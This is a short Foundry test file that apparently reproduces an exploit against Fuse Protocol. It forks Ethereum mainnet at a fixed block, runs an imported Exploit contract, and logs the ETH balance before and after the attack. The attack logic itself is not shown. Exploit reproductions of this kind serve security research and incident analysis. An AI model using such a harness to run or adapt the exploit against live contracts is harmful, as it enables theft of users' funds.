// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import "../FuseProtocolExploit.sol";

contract ContractTest is Test{
    Exploit exp;

    function setUp() public {
        vm.createSelectFork("mainnet", 14684684);
    }

    function testFuseProtocol() public {
        exp = new Exploit();
        console.log("ETH balance before attack: ", address(exp).balance);
        exp.exploit();
        console.log("ETH balance after attack", address(exp).balance);
    }
}